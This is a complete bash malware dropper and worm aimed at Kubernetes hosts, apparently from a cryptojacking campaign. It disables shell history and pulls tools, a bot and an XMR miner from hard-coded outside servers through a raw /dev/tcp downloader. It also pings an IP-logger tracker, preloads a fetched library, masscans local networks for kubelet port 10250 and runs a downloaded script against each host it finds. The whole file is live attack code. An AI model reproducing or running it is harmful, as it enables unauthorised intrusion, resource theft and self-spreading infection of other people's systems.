

if [ "$(hostname)" = "HaXXoRsMoPPeD" ]; then exit ; fi



export LC_ALL=C.UTF-8 2>/dev/null 1>/dev/null
export LANG=C.UTF-8 2>/dev/null 1>/dev/null
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
HISTSIZE=0 2>/dev/null 1>/dev/null
unset HISTFILE 2>/dev/null 1>/dev/null

export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin

if [ -d "/etc/.../.kube.lan.lock/" ]; then exit ; fi
mkdir -p /etc/.../.kube.lan.lock/ 2>/dev/null 1>/dev/null




#	curl -sLk http://chimaera.cc/sh/spr/Kubernetes.LAN.IP.Range.sh | bash

BIN_CURL="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../curl/$(uname -m)"
BIN_BOT="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../TNTb/$(uname -m)"
BIN_PNSCAN="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../pnscan/$(uname -m)"
BIN_JQ="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../jq/$(uname -m)"
BIN_MASSCAN="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../masscan/x86_64"
BIN_ZGRAB="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../zgrab/$(uname -m)"
BIN_XMR="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../xmr/$(uname -m)"
BINS_DOCKER="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../docker/$(uname -m).tgz"

SO_LIBPCAP="http://chimaera.cc/bin/libpcap.so"
CERT_DOCKER="http://chimaera.cc/data/ca.pem"
SRC_PNSCAN="http://chimaera.cc/bin/pnscan_1.14.1.orig.tar.gz"
KUBEN2BASH="http://chimaera.cc/sh/kuben2.sh"

pull() {
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do 
      [[ "$line" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
}

	if ! type curl 2>/dev/null 1>/dev/null; then 
	pull $BIN_CURL > /usr/bin/curl
	chmod +x /usr/bin/curl 2>/dev/null 1>/dev/null
	fi


curl -sLk https://iplogger.org/1A4Cu7 -o /dev/null


VIC_O_IP=$(curl -sLk ipv4.icanhazip.com)
HTTP_SRC="hhttp://chimaera.cc/bin/x86_64"





if ! ( [ -f "/.dockerd" ] || [ -f "~/.dockerd" ] ); then
curl -sLk -o ~/.dockerd $(curl -sLk http://chimaera.cc/data/bot.txt)
chmod 755 ~/.dockerd ; ~/.dockerd ; fi




	if ! type pnscan 2>/dev/null 1>/dev/null; then pull $BIN_PNSCAN > /usr/bin/pnscan
	chmod +x /usr/bin/pnscan 2>/dev/null 1>/dev/null ; fi
		/usr/bin/pnscan 127.0.0.0/24 22 2>/dev/null 1>/dev/null
		CHECK_PNS=$?
		if [ "$CHECK_PNS" = "0" ]; then echo "$VIC_O_IP - PnScan is working!" ; else echo "$VIC_O_IP - PnScan NOT working!" ; exit ; fi

				if ! type jq 2>/dev/null 1>/dev/null; then pull $BIN_JQ > /usr/bin/jq
				chmod +x /usr/bin/jq 2>/dev/null 1>/dev/null ; fi
					jq --help 2>/dev/null 1>/dev/null
					CHECK_JQ=$?
					if [ "$CHECK_JQ" = "0" ]; then echo "$VIC_O_IP - JQ is working!" ; else echo "$VIC_O_IP - JQ NOT working!" ; exit ; fi

if ! type masscan 2>/dev/null 1>/dev/null; then pull $BIN_MASSCAN > /usr/bin/masscan
chmod +x /usr/bin/masscan 2>/dev/null 1>/dev/null ; fi
masscan 127.0.0.0/24 -p22 2>/dev/null 1>/dev/null
CHECK_1_MS=$?
if [ "$CHECK_1_MS" = "0" ]; then 
echo "$VIC_O_IP - MasScan is working!"
else
if [ ! -d "/usr/lib/x86_64-linux-gnu/" ]; then mkdir -p /usr/lib/x86_64-linux-gnu/ 2>/dev/null 1>/dev/null ; fi 
pull $SO_LIBPCAP > /usr/lib/x86_64-linux-gnu/libpcap.so
export LD_PRELOAD="/usr/lib/x86_64-linux-gnu/libpcap.so"
masscan 127.0.0.0/24 -p22 2>/dev/null 1>/dev/null
CHECK_2_MS=$?
if [ "$CHECK_2_MS" = "0" ]; then 
echo "$VIC_O_IP - MasScan is working!"
else
unset LD_PRELOAD
echo "$VIC_O_IP - MasScan NOT working!"
exit
fi
fi

rm -f /usr/bin/kuben2 2>/dev/null 1>/dev/null
if [ ! -f "/usr/bin/kuben2" ]; then 
wget $KUBEN2BASH -O /usr/bin/kuben2
chmod +x /usr/bin/kuben2
fi


LAN_IP_RANGES=$(ip r | awk '{print $1}' | grep -v 'default\|0.0.0.0\|blackhole' | grep '/')
if [ -z "$LAN_IP_RANGES" ]; then 
LAN_IP_RANGES=("10.0.0.0/8" "172.16.0.0/12" "192.168.0.0/16" "169.254.0.0/16" "100.64.0.0/10")
fi

rm -f /var/tmp/.out.txt 2>/dev/null

for LAN_RANGE in ${LAN_IP_RANGES[@]} ; do
masscan -p10250 --rate=20000 --open $LAN_RANGE  | awk '{print $6}' >> /var/tmp/.out.txt
done 

while read LOCAL_TARGET
do
if [ ! -z "$LOCAL_TARGET" ];then 
echo "checke $LOCAL_TARGET"
kuben2 $LOCAL_TARGET
fi
done < /var/tmp/.out.txt

rm -f /var/tmp/.out.txt 2>/dev/null 1>/dev/null





history -c
clear
